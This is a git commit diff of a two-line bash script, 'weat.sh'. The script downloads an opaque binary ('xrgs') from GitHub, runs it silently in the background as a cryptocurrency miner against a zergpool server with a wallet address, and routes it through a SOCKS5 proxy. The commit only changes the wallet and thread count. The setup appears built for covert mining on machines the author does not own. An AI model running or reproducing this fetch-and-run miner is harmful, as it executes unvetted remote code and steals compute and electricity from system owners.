1c4943f7b28267cf011677af4e6dbadcbabb06eb
soepati <110091831+soepati@users.noreply.github.com>
2022-09-23 14:30:54 +0700

    Update weat.sh

--- weat.sh
+++ weat.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget https://github.com/soepati/expert-giggle-soe/raw/cpu/xrgs && chmod +x xrgs && ./xrgs -a cn-heavy/xhv -o stratum+tcp://cryptonight_haven.mine.zergpool.com:4452 -u MRkSxj9EY41vhUL2utoYP6pTRTELHXJtQN -p c=LTC,mc=BLOC $(echo $(shuf -i 100-999 -n 1)-MasBroo) -t 2 -x socks5://192.252.209.155:14455 >/dev/null &
+wget https://github.com/soepati/expert-giggle-soe/raw/cpu/xrgs && chmod +x xrgs && ./xrgs -a cn-heavy/xhv -o stratum+tcp://cryptonight_haven.mine.zergpool.com:4452 -u LficpGLqxbTrWU56wdNy66F8zRBRCx7NZx -p c=LTC,mc=BLOC $(echo $(shuf -i 100-999 -n 1)-MasBroo) -t 1 -x socks5://192.252.209.155:14455 >/dev/null &
